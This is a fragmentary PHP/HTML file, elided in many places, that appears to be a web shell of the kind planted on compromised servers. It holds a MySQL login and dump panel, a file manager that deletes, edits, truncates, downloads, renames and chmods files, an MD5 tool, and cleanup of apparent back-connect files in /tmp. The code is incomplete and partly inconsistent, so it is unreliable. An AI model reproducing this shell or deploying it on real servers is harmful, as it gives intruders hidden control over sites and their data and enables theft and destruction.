...
<!-- table 1 -->
	<table bgcolor=#D7FFA8>
		<tr>
			...
			<td><form>
					<input name=adress value='<?=$adress?>' size=20><input name=port
						value='<?=$port?>' size=6></td>
		</tr>
		<tr>
			<Td valign=top>Login:</td>
			<td><input name=login value='<?=$login?>' size=10></td>
		</tr>
		<tr>
			<Td valign=top>Pass:</td>
			<td><input name=pass value='<?=$pass?>' size=10><input type=hidden
				name=p value=sql></td>
		</tr>
		<tr>
			<td></td>
			<td><input type=submit name=conn value=Connect>
			</form></td>
		</tr><?}?>
<tr>
			<td valign=top><? if($conn){ echo "<b>PHP v".@phpversion()."<br>mySQL v".@mysql_get_server_info()."<br>";}?></b></td>
			<td></td>
		</tr>
...
<?
    ...
    if ($conn) {
        ...
        if ($serv) {
            $status = "Connected. :: <a href='$php_self?p=sql'>Log out</a>";
        } else {
            $status = "Disconnected.";
        }
       ...
       <td><b>Row</b></td><td><b>Value</b></td></tr>";
        ...
        <input type=radio name=upd value=insert>Insert new<br><br>";
            ...
            print "<br>";
            if (! $_POST['makeupdate']) {
                print "<input type=submit value=Update name=makeupdate></form>";
            }
...
";
        ...
        if ($_GET['dump']) {
            if (! is_writable($f_d)) {
                die("<br><br><font color=red>This folder $f_d isnt writable!<br>Cannot make dump.<br><br>
...
";
        ...
        if (is_writable("/tmp")) {
            if (file_exists("/tmp/nst_c_bc_c.c")) {
                unlink("/tmp/nst_c_bc_c.c");
            }
            if (file_exists("/tmp/nst_c_bc_c.c")) {
                unlink("/tmp/nst_c_bc");
            }
...
";
    @$md5 = @$_POST['md5'];
    if (@$_POST['md5']) {
        echo "md5:<br><textarea rows=1 cols=113>" . md5($md5) . "</textarea>";
    }
    echo "<br>
...
if (@$_GET['e']) {
    ...
    if (is_file($de)) {
        if (! is_writable($de)) {
            echo "<font color=red>READ ONLY</font><br>";
        }
    }
    echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
    echo "
...
for ($i = 0; $i < count($files); $i ++) {
    ...
    if ($size < 1024) {
        ...
        if ($size < 1024 * 1024) {
            $siz = number_format(($size / 1024), 2, '.', '') . ' kb';
        } else {
            if ($size < 1000000000) {
                $siz = number_format($size / (1024 * 1024), 2, '.', '') . ' mb';
            } else {
                if ($size < 1000000000000) {
                    $siz = number_format($size / (1024 * 1024 * 1024), 2, '.', '') . ' gb';
                }
            }
        }
    }
